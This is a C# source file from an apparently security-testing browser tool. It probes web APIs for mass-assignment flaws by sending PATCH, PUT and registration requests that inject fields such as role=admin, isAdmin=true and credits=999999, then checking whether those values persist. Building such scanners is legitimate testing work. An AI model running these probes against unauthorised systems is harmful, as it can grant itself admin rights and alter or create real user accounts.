using System.Text.Json;
using System.Text.Json.Nodes;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Extended mass-assignment: PATCH/PUT self-promote and registration scaffold with persistence verify.
/// Findings prefer JSON key persistence over substring reflection; reflection-only is at most medium.
/// Inspired by OWASP WSTG-INPV-20 and OWASP API mass-assignment/BOPLA; also influenced by pentest-ai
/// <c>web.privilege_escalation_patch</c> / <c>web.mass_assignment</c>. Mutates profiles / may create users.
/// </summary>
public static class MassAssignmentExtendedProbes
{
    public sealed class PatchProbeOptions
    {
        public int TimeoutMs { get; set; } = 15000;
        public int MaxFields { get; set; } = 8;
    }

    public sealed class PatchProbeRow
    {
        public string Url { get; init; } = "";
        public string Method { get; init; } = "";
        public string Field { get; init; } = "";
        public string InjectedValue { get; init; } = "";
        public int UpdateStatus { get; init; }
        public bool ValuePersisted { get; init; }
        public string? VerifyUrl { get; init; }
        public string Severity { get; init; } = "high";
        public string Category { get; init; } = "mass-assignment";
    }

    public sealed class PatchProbeResult
    {
        public string? UserId { get; init; }
        public string? MeUrl { get; init; }
        public List<PatchProbeRow> Probes { get; init; } = [];
        public List<string> Summary { get; init; } = [];
    }

    public sealed class RegisterScaffoldOptions
    {
        public int TimeoutMs { get; set; } = 15000;
        public int MaxPaths { get; set; } = 6;
        public IReadOnlyList<string>? Paths { get; set; }
    }

    public sealed class RegisterScaffoldRow
    {
        public string Url { get; init; } = "";
        public string Field { get; init; } = "";
        public string InjectedValue { get; init; } = "";
        public int Status { get; init; }
        public bool ValueReflected { get; init; }
        public bool? ValuePersisted { get; init; }
        public string Severity { get; init; } = "high";
        public string Category { get; init; } = "mass-assignment";
        public string Source { get; init; } = "registration";
    }

    public sealed class RegisterScaffoldResult
    {
        public List<RegisterScaffoldRow> Findings { get; init; } = [];
        public List<string> PathsProbed { get; init; } = [];
        public List<string> Summary { get; init; } = [];
    }

    private static readonly string[] MePaths =
    [
        "/api/users/me", "/api/me", "/api/profile", "/api/v1/users/me",
        "/api/v1/me", "/api/account", "/api/user", "/rest/user/whoami"
    ];

    private static readonly (string Method, string Template)[] UpdateTemplates =
    [
        ("PATCH", "/api/users/{id}"), ("PUT", "/api/users/{id}"),
        ("PATCH", "/api/v1/users/{id}"), ("PUT", "/api/v1/users/{id}"),
        ("PATCH", "/api/users/me"), ("PUT", "/api/users/me"),
        ("PATCH", "/api/profile"), ("PUT", "/api/profile"),
        ("PATCH", "/api/account"), ("PUT", "/api/account"),
    ];

    public static readonly string[] DefaultRegistrationPaths =
    [
        "/api/Users", "/api/users", "/api/users/register", "/api/auth/register",
        "/api/v1/users", "/register", "/rest/user/register"
    ];

    private static readonly (string Field, JsonNode Value, string Display, string Severity)[] PrivilegedFields =
    [
        ("role", JsonValue.Create("admin")!, "admin", "critical"),
        ("isAdmin", JsonValue.Create(true)!, "true", "critical"),
        ("is_admin", JsonValue.Create(true)!, "true", "critical"),
        ("admin", JsonValue.Create(true)!, "true", "critical"),
        ("is_premium", JsonValue.Create(true)!, "true", "high"),
        ("credits", JsonValue.Create(999999)!, "999999", "high"),
        ("balance", JsonValue.Create(999999)!, "999999", "high"),
        ("verified", JsonValue.Create(true)!, "true", "high"),
    ];

    public static async Task<PatchProbeResult> RunPrivilegeEscalationPatchAsync(
        AutomationContext ctx,
        PatchProbeOptions options,
        CancellationToken ct = default)
    {
        var pageUrl = await ctx.GetCurrentUrl();
        if (!Uri.TryCreate(pageUrl, UriKind.Absolute, out var pageUri))
            throw new InvalidOperationException("Navigate to a page before running privilege-escalation patch probe.");

        var origin = pageUri.GetLeftPart(UriPartial.Authority);
        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["Content-Type"] = "application/json",
            ["Accept"] = "application/json, text/plain, */*",
        };

        var (userId, meUrl, meBody) = await DiscoverCurrentUserAsync(ctx, origin, headers, options.TimeoutMs, ct);
        var result = new PatchProbeResult { UserId = userId, MeUrl = meUrl };
        var summary = result.Summary;
        var probes = new List<PatchProbeRow>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var (method, template) in UpdateTemplates)
        {
            ct.ThrowIfCancellationRequested();
            string path;
            if (template.Contains("{id}", StringComparison.Ordinal))
            {
                if (string.IsNullOrEmpty(userId)) continue;
                path = template.Replace("{id}", userId, StringComparison.Ordinal);
            }
            else
            {
                path = template;
            }

            var url = origin + path;
            foreach (var (field, value, display, severity) in PrivilegedFields)
            {
                if (probes.Count >= options.MaxFields) break;
                ct.ThrowIfCancellationRequested();
                var dedup = $"{url}|{field}";
                if (!seen.Add(dedup)) continue;

                var payload = new JsonObject { [field] = value.DeepClone() };
                var updateJson = await ctx.Fetch(url, method, headers, payload.ToJsonString(), options.TimeoutMs);
                var (updateStatus, _, _) = ParseFetch(updateJson);
                if (updateStatus is not (200 or 201 or 204)) continue;

                var verifyUrl = meUrl ?? origin + "/api/users/me";
                var verifyJson = await ctx.Fetch(verifyUrl, "GET", headers, null, options.TimeoutMs);
                var (_, verifyBody, _) = ParseFetch(verifyJson);
                var persisted = JsonWalkContains(verifyBody, field, value, display);

                probes.Add(new PatchProbeRow
                {
                    Url = url,
                    Method = method,
                    Field = field,
                    InjectedValue = display,
                    UpdateStatus = updateStatus,
                    ValuePersisted = persisted,
                    VerifyUrl = verifyUrl,
                    Severity = persisted ? severity : "info",
                    Category = "mass-assignment",
                });

                if (persisted)
                    summary.Add($"PATCH/PUT {path}: field \"{field}\" persisted on user record (verify GET {verifyUrl}).");
            }
        }

        if (probes.Count == 0)
            summary.Add("No privileged fields persisted via PATCH/PUT profile update endpoints.");
        else if (!probes.Any(p => p.ValuePersisted))
            summary.Add("Update endpoints accepted requests but privileged fields did not persist on verify GET.");

        result = new PatchProbeResult
        {
            UserId = userId,
            MeUrl = meUrl,
            Probes = probes,
            Summary = summary
        };
        return result;
    }

    public static async Task<RegisterScaffoldResult> RunRegistrationScaffoldAsync(
        AutomationContext ctx,
        RegisterScaffoldOptions options,
        CancellationToken ct = default)
    {
        var pageUrl = await ctx.GetCurrentUrl();
        if (!Uri.TryCreate(pageUrl, UriKind.Absolute, out var pageUri))
            throw new InvalidOperationException("Navigate to a page before running registration scaffold probe.");

        var origin = pageUri.GetLeftPart(UriPartial.Authority);
        var paths = (options.Paths is { Count: > 0 } ? options.Paths : DefaultRegistrationPaths)
            .Take(Math.Max(1, options.MaxPaths)).ToList();
        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["Content-Type"] = "application/json",
            ["Accept"] = "application/json, text/plain, */*",
        };

        var findings = new List<RegisterScaffoldRow>();
        var summary = new List<string>();

        foreach (var path in paths)
        {
            var url = origin + (path.StartsWith('/') ? path : "/" + path);
            var baselineEmail = $"trowser-ma-{Guid.NewGuid():N}"[..28] + "@trowser.test";
            var baseline = new JsonObject
            {
                ["email"] = baselineEmail,
                ["password"] = "TrowserMa1!Aa"
            };

            var baselineJson = await ctx.Fetch(url, "POST", headers, baseline.ToJsonString(), options.TimeoutMs);
            var (bStatus, _, _) = ParseFetch(baselineJson);
            if (bStatus is not (200 or 201)) continue;

            foreach (var (field, value, display, severity) in PrivilegedFields)
            {
                var attackEmail = $"trowser-ma-{Guid.NewGuid():N}"[..28] + "@trowser.test";
                var body = new JsonObject
                {
                    ["email"] = attackEmail,
                    ["password"] = "TrowserMa1!Aa",
                    [field] = value.DeepClone()
                };
                var attackJson = await ctx.Fetch(url, "POST", headers, body.ToJsonString(), options.TimeoutMs);
                var (aStatus, aBody, _) = ParseFetch(attackJson);
                if (aStatus is not (200 or 201)) continue;

                var reflected = JsonWalkContains(aBody, field, value, display);
                bool? persisted = null;
                var userId = JsonWalkFind(aBody, "id") ?? JsonWalkFind(aBody, "user_id");
                if (reflected && userId != null)
                {
                    var followUrl = $"{url.TrimEnd('/')}/{userId}";
                    var followJson = await ctx.Fetch(followUrl, "GET", headers, null, options.TimeoutMs);
                    var (_, followBody, _) = ParseFetch(followJson);
                    persisted = JsonWalkContains(followBody, field, value, display);
                }

                if (reflected || persisted == true)
                {
                    // Reflection-only (no persistence verify) is at most medium.
                    var rowSeverity = persisted == true
                        ? "critical"
                        : CapSeverityAtMedium(severity);
                    findings.Add(new RegisterScaffoldRow
                    {
                        Url = url,
                        Field = field,
                        InjectedValue = display,
                        Status = aStatus,
                        ValueReflected = reflected,
                        ValuePersisted = persisted,
                        Severity = rowSeverity,
                        Category = "mass-assignment",
                    });
                    summary.Add($"Registration {url}: {field}={display} {(persisted == true ? "persisted" : "reflected")}.");
                }
            }
        }

        if (findings.Count == 0)
            summary.Add($"Probed {paths.Count} registration path(s); no mass-assignment via registration detected.");

        return new RegisterScaffoldResult
        {
            Findings = findings,
            PathsProbed = paths,
            Summary = summary
        };
    }

    private static async Task<(string? UserId, string? MeUrl, string? MeBody)> DiscoverCurrentUserAsync(
        AutomationContext ctx, string origin, Dictionary<string, string> headers, int timeoutMs, CancellationToken ct)
    {
        foreach (var path in MePaths)
        {
            ct.ThrowIfCancellationRequested();
            var url = origin + path;
            var json = await ctx.Fetch(url, "GET", headers, null, timeoutMs);
            var (status, body, _) = ParseFetch(json);
            if (status != 200 || string.IsNullOrWhiteSpace(body)) continue;

            var id = JsonWalkFind(body, "id") ?? JsonWalkFind(body, "user_id") ?? JsonWalkFind(body, "userId");
            if (!string.IsNullOrEmpty(id))
                return (id, url, body);
        }

        return (null, null, null);
    }

    private static string? JsonWalkFind(string text, string key)
    {
        try
        {
            var node = JsonNode.Parse(text);
            return Walk(node, key)?.ToString();
        }
        catch { return null; }
    }

    private static readonly HashSet<string> GenericDisplayValues = new(StringComparer.OrdinalIgnoreCase)
    {
        "true", "false", "admin", "999999", "0", "1", "null"
    };

    private static bool JsonWalkContains(string text, string field, JsonNode expected, string display)
    {
        try
        {
            var node = JsonNode.Parse(text);
            var got = Walk(node, field);
            if (got == null) return false;
            return JsonNode.DeepEquals(got, expected)
                   || string.Equals(got.ToJsonString(), expected.ToJsonString(), StringComparison.Ordinal);
        }
        catch
        {
            // Prefer JSON key-path match only. Substring fallback only for long, non-generic values.
            if (string.IsNullOrEmpty(display) || display.Length < 8 || GenericDisplayValues.Contains(display))
                return false;
            return text.Contains(display, StringComparison.Ordinal);
        }
    }

    private static string CapSeverityAtMedium(string severity) =>
        severity is "critical" or "high" ? "medium" : severity;

    private static JsonNode? Walk(JsonNode? node, string key)
    {
        if (node == null) return null;
        if (node is JsonObject o)
        {
            if (o.TryGetPropertyValue(key, out var direct) && direct != null) return direct;
            foreach (var p in o)
            {
                var found = Walk(p.Value, key);
                if (found != null) return found;
            }
        }
        else if (node is JsonArray { Count: > 0 } a)
        {
            return Walk(a[0], key);
        }
        return null;
    }

    private static (int status, string body, bool ok) ParseFetch(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;
            var status = root.GetProperty("status").GetInt32();
            var body = root.TryGetProperty("body", out var b)
                ? b.ValueKind == JsonValueKind.String ? b.GetString() ?? "" : b.GetRawText()
                : "";
            var ok = root.TryGetProperty("ok", out var o) && o.ValueKind == JsonValueKind.True;
            return (status, body, ok);
        }
        catch
        {
            return (0, "", false);
        }
    }
}
